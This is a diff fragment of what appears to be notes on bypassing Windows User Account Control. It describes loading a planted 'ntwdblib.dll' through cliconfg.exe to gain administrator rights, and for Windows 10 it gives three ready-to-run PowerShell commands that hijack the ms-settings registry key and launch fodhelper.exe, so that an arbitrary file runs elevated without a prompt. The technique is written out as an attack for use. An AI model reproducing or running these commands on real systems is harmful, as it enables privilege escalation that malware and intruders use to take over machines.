@@ -14,8 +14,10 @@ We start the process "%systemroot%\system32\cliconfg.exe" with user rights, but 
 it executes itself with administrator privileges and loads our dll library "%systemroot%\system32\ntwdblib.dll"
 in connection with which it inherits administrator rights and is able to execute any PE file bypassing the UAC window.
 
+
 Windows 10
 We use the vulnerability of the process from the white list "fodhelper.exe"
+
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "path to our file" -Force
 powershell New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
 powershell Start-Process "fodhelper.exe"
